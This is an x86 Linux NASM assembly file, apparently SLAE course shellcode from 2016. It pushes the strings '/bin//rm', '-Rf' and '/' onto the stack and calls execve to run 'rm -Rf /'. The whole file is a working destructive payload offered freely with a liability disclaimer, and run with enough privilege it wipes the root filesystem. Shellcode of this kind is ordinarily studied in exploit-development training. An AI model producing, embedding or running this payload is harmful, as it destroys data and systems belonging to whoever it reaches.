;-------------------------------------------------------------                                                         
;                             _____   ______             _ 
;  _                         (_____) (______)          _(_)
; (_)__  __   __      ______ (_)__(_)(_)__           _(_)  
; (____)(__)_(__)    (______)(_____) (____)        _(_)    
; (_)  (_) (_) (_)           ( ) ( ) (_)         _(_)      
; (_)  (_) (_) (_)           (_)  (_)(_)        (_)        
;                                                         
; rm-RF-root.nasm                                                         
; by Michael Born (@blu3gl0w13)
; Student ID SLAE-744
; September 2, 2016
;
; Free to use and distribute
; Author is NOT responsible or liable
; for any misuse of this script
;
;------------------------------------------------------------



global _start

section .text

_start:

	; int execve(const char *filename, char *const argv[],
        ;          char *const envp[])

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	push eax			; null onto stack
	push 0x6d722f2f			; mr//
	push 0x6e69622f			; nib/
	mov ebx, esp			; 1st parameter set
	push eax			; null onto stack
	push 0x66522d			; "fR-"
	mov esi, esp			; store pointer to "fR-" temporarily
	push eax			; null terminate the array value
	push byte 0x2f			; "/" onto stack
	mov edi, esp			; store pointer to "/"
	push eax			; NULL terminator
	push edi			; pointer to "/"
	push esi			; pointer to "fR-"
	push ebx			; pointer to mr//nib/
	mov ecx, esp			; 2nd parameter to execve
	xor edx, edx			; 3rd parameter to execve
	mov al, 0xb			; execve sys call
	int 0x80			; execute
